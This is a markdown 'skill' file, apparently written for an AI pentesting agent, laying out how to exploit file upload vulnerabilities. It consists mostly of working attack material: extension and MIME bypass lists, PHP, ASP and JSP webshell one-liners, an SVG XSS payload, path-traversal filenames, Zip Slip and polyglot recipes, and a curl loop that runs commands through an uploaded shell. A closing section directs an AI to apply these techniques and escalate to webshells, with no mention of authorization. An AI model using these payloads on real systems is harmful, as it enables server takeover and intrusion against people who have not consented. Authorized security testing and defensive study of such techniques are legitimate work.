# File Upload Vulnerabilities Skill

## Goal

Identify and exploit file upload vulnerabilities to achieve code execution, XSS, or other attacks.

## Methodology

1. **Identify Upload Functionality:** Find all file upload endpoints
2. **Test Extension Filters:** Upload files with various extensions
3. **Bypass Content-Type Checks:** Manipulate MIME types
4. **Test for Execution:** Determine if uploaded files can be executed
5. **Escalate Attack:** Achieve webshell, XSS, or path traversal

## Extension Bypass Techniques

```bash
# Case variation
file.pHp, file.PHP, file.Php

# Double extensions
file.php.jpg, file.jpg.php

# Null byte (older systems)
file.php%00.jpg, file.php\x00.jpg

# Alternative extensions
file.php5, file.phtml, file.phar
file.asp, file.aspx, file.cer
file.jsp, file.jspx

# Add trailing characters
file.php., file.php..., file.php/
file.php::$DATA (Windows)
```

## Content-Type Bypass

```http
# Change Content-Type header
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Magic bytes + shell
GIF89a<?php system($_GET['cmd']); ?>
```

## Webshell Payloads

### PHP
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['c']); ?>
<?=`$_GET[c]`?>
```

### ASP
```asp
<%eval request("cmd")%>
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

## SVG XSS Payload
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

## Path Traversal Upload
```http
# Upload to different directory
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Disposition: form-data; name="file"; filename="..%2F..%2Fshell.php"
```

## Archive-Based Attacks

### Zip Slip
```bash
# Create zip with path traversal
python -c "import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.write('shell.php','../../../var/www/html/shell.php')"
```

### Polyglot Files
```bash
# Create file that's both valid image and PHP
cat image.gif shell.php > polyglot.php.gif
```

## Race Condition
```bash
# Upload and access before deletion
while true; do curl http://target/uploads/shell.php?cmd=id; done &
curl -F "file=@shell.php" http://target/upload
```

## Tools

* **Burp Suite** - Intercept and modify uploads
* **fuxploider** - Automated file upload testing
* **Web shells** - Collection of webshell payloads

## Guidance for AI

* Activate when testing file upload functionality
* Start with extension and content-type bypass techniques
* Check where files are stored and if they're directly accessible
* Test for execution by trying to access uploaded webshells
* SVG files can contain XSS payloads
* Archive extraction may be vulnerable to Zip Slip
* Check for race conditions in upload-then-validate flows
